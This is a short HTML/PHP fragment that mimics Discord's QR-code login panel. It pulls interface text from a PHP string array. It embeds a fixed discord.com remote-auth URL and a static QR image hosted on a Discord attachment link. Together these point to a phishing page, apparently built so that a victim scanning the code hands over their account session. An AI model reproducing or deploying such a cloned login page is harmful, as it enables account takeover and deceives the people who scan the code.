		                                        ...
		                                        <div class="transitionGroup-aR7y1d qrLogin-1AOZMt">
		                                            <div class="measurementFill-31KKmO measurement-DMxQp7 measurementFillStatic-MZ1pNY">
		                                                <div class="animatedNode-5VAmrN" style="overflow: visible; opacity: 1; height: 100%; transform: translateX(0%);">
		                                                    <div class="qrLoginInner-c_7ePj"><div class="qrCodeContainer-3sXarj"><div class="asi qrCode-wG6ZgU" title="https://discord.com/ra/xVaQmLO_ZnARSznjjSth2SYKx-6w98o3fL503OEXNDQ" style="padding: 8px; border-radius: 4px; background: rgb(255, 255, 255);"><canvas width="160" height="160" style="display: none;"></canvas><img alt="Scan me!" src="https://media.discordapp.net/attachments/968639157125677086/969304245797015553/unknown.png" style="display: block;"></div><div class="qrCodeOverlay-qgtlTP"><img src="source/img/092b071c3b3141a58787415450c27857.png" class= "asi" alt=""></div></div><h3 class="title-jXR8lp marginBottom8-AtZOdT base-1x0h_U size24-RIRrxO"><?php  print_r($alphabet[9]);?></h3><div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf"><?php  print_r($alphabet[10]);?><strong><?php  print_r($alphabet[11]);?></strong><?php  print_r($alphabet[12]);?></div></div>
		                                                </div>
		                                            </div>
		                                        </div>
		                                    </div>
